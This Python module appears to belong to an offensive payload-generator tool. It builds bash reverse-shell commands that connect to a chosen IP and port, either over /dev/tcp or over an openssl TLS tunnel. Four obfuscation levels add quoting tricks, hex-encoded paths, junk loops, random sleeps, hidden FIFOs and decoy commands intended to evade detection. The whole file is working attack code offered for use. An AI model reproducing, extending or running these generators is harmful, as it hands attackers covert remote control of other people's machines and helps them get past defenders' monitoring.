import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def make_raw(ip, port, use_ssl):
	if use_ssl:
		raw = (
			f"bash -c '/bin/mkfifo /tmp/.fifo && "
			f"openssl s_client -quiet -connect {ip}:{port} < /tmp/.fifo | "
			f"bash -i 2>&1 > /tmp/.fifo && "
			f"rm /tmp/.fifo'"
		)

	else:
		raw = (
			f"bash -c '/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1'"
		)

	return raw


def generate_bash_reverse_tcp(ip, port, obs, use_ssl):
	if obs == 0:
		payload = make_raw(ip, port, use_ssl)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 1:
		payload = generate_bash_reverse_tcp_obs1(ip, port, use_ssl)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 2:
		payload = generate_bash_reverse_tcp_obs2(ip, port, use_ssl)
		payutils.copy_and_print(payload)
		return payload

	elif obs == 3:
		payload = generate_bash_reverse_tcp_obs3(ip, port, use_ssl)
		payutils.copy_and_print(payload)
		return payload


def generate_bash_reverse_tcp_obs1(ip, port, use_ssl):
	ip_parts = ip.split('.')
	ip_literal = "+'.'+".join(f"'{part}'" for part in ip_parts)

	# 2) Port literal (could be math, but keep it simple)
	port_literal = str(port)

	if use_ssl:
			payload = (
			"bash -c 'f=/t$'/mp/.fif$'o; "
			"m=/b$'in/mkfifo; "
			"o=/u$'sr/bin/openssl; "
			"b=/b$'in/bash; "
			f"p={port_literal}; "
			f"ip={ip_literal}; "
			"${m}${IFS}${f}&& "
			"${o}${IFS}s_client${IFS}-quiet${IFS}-connect${IFS}${ip}:${p}<${IFS}${f}|"
			"${b}${IFS}-i${IFS}2>&1>${IFS}${f}&&"
			"rm${IFS}${f}'"
			)
	else:
		payload = (
			"bash -c 'h=/d$'ev/tcp'; "
			"a=/b$'in/bash; "
			f"p={port_literal}; "
			f"ip={ip_literal}; "
			"${a:0:5}${IFS}-i${IFS}>&${IFS}${h}/${ip}/${p}${IFS}0>&1'"
		)

	return payload

def generate_bash_reverse_tcp_obs2(ip, port, use_ssl):

	def hex_encode(s):
		return ''.join(f"\\x{b:02x}" for b in s.encode())

	ip_hex   = hex_encode(ip)
	port_hex = hex_encode(str(port))

	if use_ssl:
		parts = [
			'rnd=$(tr -dc a-z0-9 </dev/urandom|head -c6)',
			f'd=$(printf "%b" "{ip_hex}")',
			f'p=$(printf "%b" "{port_hex}")',
			't1=$(printf "%b" "\\x6f\\x70\\x65\\x6e\\x73\\x73\\x6c")',      # "openssl"
			't2=$(printf "%b" "\\x73\\x5f\\x63\\x6c\\x69\\x65\\x6e\\x74")',  # "s_client"
			f'opt=$(printf "%b" "{hex_encode("-quiet -connect")}")',
			'f="/tmp/$rnd"',
			'm=$(printf "%b" "\\x2f\\x62\\x69\\x6e\\x2f\\x6d\\x6b\\x66\\x69\\x66\\x6f")',
			'$m $f',
			'$t1 $t2 $opt $d:$p < $f | bash > $f; rm $f',
		]
		inner = "; ".join(parts)
		payload = f"bash -c '{inner}'"

	else:
		parts = [
			'rnd=$(tr -dc a-z0-9 </dev/urandom|head -c6)',
			f'd=$(printf "%b" "{ip_hex}")',
			f'p=$(printf "%b" "{port_hex}")',
			'dev=$(printf "%b" "\\x2f\\x64\\x65\\x76\\x2f\\x74\\x63\\x70")',  # "/dev/tcp"
			'b=$(printf "%b" "\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68")',  # "/bin/bash"
			# open a bidirectional FD on /dev/tcp/$d/$p
			'exec 3<>"$dev/$d/$p"',
			# pivot the shell over FD 3
			'bash <&3 >&3 2>&3',
		]

		inner = "; ".join(parts)
		payload = f"bash -c '{inner}'"

	return payload


def generate_bash_reverse_tcp_obs3(ip, port, use_ssl):

	def hex_encode(s):
		return ''.join(f"\\x{b:02x}" for b in s.encode())

	# hex-escape IP and port
	ip_hex   = hex_encode(ip)
	port_hex = hex_encode(str(port))

	parts = []

	if use_ssl:

		# ── 1) Junk math loops / timing obfuscation ─────────────────────────────────────────
		parts.append(
			# compute a small “burn” and then sleep a random 0–2 seconds
			'rnd_loops=$((RANDOM%5+3)); junk=0; '
			'for((i=0;i<rnd_loops;i++));do junk=$((junk + (RANDOM%50)*i));done; '
			'sleep $((RANDOM%3))s'
		)

		# ── 2) Scatter & randomize your FIFO ─────────────────────────────────────────────
		parts.append(
			# choose either XDG_RUNTIME_DIR or fallback to /dev/shm
			'base_dir="${XDG_RUNTIME_DIR:-/dev/shm}/.$(tr -dc a-z0-9 </dev/urandom|head -c4)"; '
			'mkdir -p "$base_dir"; '
			'fifo="$base_dir/.$(tr -dc a-z0-9 </dev/urandom|head -c5)"'
		)

		# ── 3) Hex-build paths & host/port ───────────────────────────────────────────────
		parts.extend([
			f'o=$(printf "%b" "{hex_encode("/usr/bin/openssl")}")',
			f'b=$(printf "%b" "{hex_encode("/bin/bash")}")',
			f'mk=$(printf "%b" "{hex_encode("/bin/mkfifo")}")',
			f'd=$(printf "%b" "{ip_hex}")',
			f'p=$(printf "%b" "{port_hex}")',
		])

		# ── 4) Junk variables & decoy commands ──────────────────────────────────────────
		parts.append(
			# define some unused decoy variables and run a harmless grep
			'decoy1=$(date +%s); decoy2=$((decoy1%7)); '
			'grep "" /etc/passwd >/dev/null 2>&1'
		)

		# ── 5) Function wrappers & indirect calls ───────────────────────────────────────
		parts.append(
			# wrap mkfifo and openssl in shell functions
			'do_fifo(){ "$mk" "$fifo"; }; '
			'do_shell(){ "$o" s_client -quiet -connect "$d:$p" <"$fifo" | "$b" >"$fifo"; }'
		)

		# ── 6) Actually run it & cleanup ────────────────────────────────────────────────
		parts.append(
			'do_fifo; do_shell; rm -rf "${base_dir}"'
		)

		inner = "; ".join(parts)
		payload = f"bash -c '{inner}'"

	else:
		# 1) Junk math loops / timing obfuscation
		parts.append(
			'rnd_loops=$((RANDOM%5+3)); junk=0; '
			'for((i=0;i<rnd_loops;i++));do junk=$((junk + (RANDOM%50)*i));done; '
			'sleep $((RANDOM%3))s'
		)

		# 2) Scatter & randomize your FIFO
		parts.append(
			'base_dir="${XDG_RUNTIME_DIR:-/dev/shm}/.$(tr -dc a-z0-9 </dev/urandom|head -c4)"; '
			'mkdir -p "$base_dir"; '
			'fifo="$base_dir/.$(tr -dc a-z0-9 </dev/urandom|head -c5)"'
		)

		# 3) Hex-build paths & host/port
		parts.extend([
			f'mk=$(printf "%b" "{hex_encode("/bin/mkfifo")}")',
			f'dev=$(printf "%b" "{hex_encode("/dev/tcp")}")',
			f'bsh=$(printf "%b" "{hex_encode("/bin/bash")}")',
			f'd=$(printf "%b" "{ip_hex}")',
			f'p=$(printf "%b" "{port_hex}")',
		])

		# 4) Junk variables & decoy commands
		parts.append(
			'decoy1=$(date +%s); decoy2=$((decoy1%7)); '
			'grep "" /etc/passwd >/dev/null 2>&1'
		)

		# 5) Function wrappers & indirect calls
		parts.append(
			'do_fifo(){ "$mk" "$fifo"; }; '
			'do_shell(){ '
			'exec 3<>"$dev/$d/$p"; '
			'cat "$fifo" >&3 & '
			'cat <&3 | "$bsh" >"$fifo"; '
			'}'
		)

		# 6) Run & cleanup
		parts.append('do_fifo; do_shell; rm -rf "${base_dir}"')

		inner = "; ".join(parts)
		payload = f"bash -c '{inner}'"


	return payload
